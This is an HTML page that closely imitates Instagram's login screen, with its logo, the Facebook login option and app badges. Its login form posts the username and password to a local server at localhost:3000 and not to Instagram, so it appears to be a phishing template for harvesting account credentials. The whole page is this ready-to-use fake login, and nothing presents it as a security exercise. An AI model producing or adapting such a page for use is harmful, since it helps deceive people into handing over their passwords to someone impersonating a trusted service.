<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram Login</title>
  <style>
    /* General Reset */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: Arial, sans-serif;
    }

    body {
      background-color: black;
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      flex-direction: column;
    }

    .container {
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .login-box {
      background-color: #000;
      border: 1px solid #262626;
      padding: 20px;
      border-radius: 10px;
      width: 350px;
      height: 402px;
      text-align: center;
    }

    .logo {
      width: 60%;
      margin: 0 auto 20px;
      display: block;
      filter: brightness(0) invert(1); /* White Instagram Logo */
    }

    input {
      width: 100%;
      padding: 10px;
      margin: 5px 0;
      background-color: #262626;
      border: 1px solid #444;
      border-radius: 5px;
      color: white;
    }

    .login-btn {
      width: 100%;
      padding: 10px;
      margin-top: 10px;
      background-color: #0095f6;
      border: none;
      border-radius: 5px;
      color: white;
      font-weight: bold;
      cursor: pointer;
    }

    .or-section {
      display: flex;
      align-items: center;
      margin: 20px 0;
    }

    .or-section .line {
      flex-grow: 1;
      height: 1px;
      background-color: #444;
    }

    .or-section span {
      padding: 0 10px;
      color: #aaa;
      font-weight: bold;
    }

    .facebook-login {
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 5px;
      margin: 10px 0;
      color: #0095f6;
      font-weight: bold;
    }

    .facebook-icon {
      width: 20px;
      height: 20px;
    }

    .forgot-password {
      display: block;
      margin: 10px 0;
      color: white; /* Changed to white */
      font-size: 14px;
      text-decoration: none;
    }

    .signup-box {
      border: 1px solid #262626;
      background-color: #000;
      text-align: center;
      width: 350px;
      padding: 15px;
      margin-top: 10px;
      border-radius: 10px;
    }

    .signup-box a {
      color: #0095f6;
      text-decoration: none;
      font-weight: bold;
    }

    .get-app {
      text-align: center;
      margin-top: 20px;
    }

    .get-app p {
      margin-bottom: 10px;
      font-size: 14px;
    }

    .app-icons {
      display: flex;
      justify-content: center;
      gap: 10px;
    }

    .store-badge {
      width: 140px;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="login-box">
      <!-- Instagram Logo -->
      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram Logo" class="logo">

      <!-- Login Form -->
      <form action="http://localhost:3000/login" method="POST">
        <input type="text" name="username" placeholder="Phone number, username, or email" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit" class="login-btn">Log in</button>
      </form>

      <!-- OR Section -->
      <div class="or-section">
        <div class="line"></div>
        <span>OR</span>
        <div class="line"></div>
      </div>

      <!-- Facebook Login -->
      <div class="facebook-login">
        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png" alt="Facebook Logo" class="facebook-icon">
        <span>Log in with Facebook</span>
      </div>

      <!-- Forgot Password -->
      <a href="#" class="forgot-password">Forgot password?</a>
    </div>

    <!-- Sign-up Box -->
    <div class="signup-box">
      <p>Don't have an account? <a href="#" class="signup-link">Sign up</a></p>
    </div>

    <!-- Get the App Section -->
    <div class="get-app">
      <p>Get the app.</p>
      <div class="app-icons">
        <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Google Play" class="store-badge">
        <img src="https://static.cdninstagram.com/rsrc.php/v4/yu/r/EHY6QnZYdNX.png" alt="Microsoft Store" class="store-badge">
      </div>
    </div>
  </div>
</body>
</html>
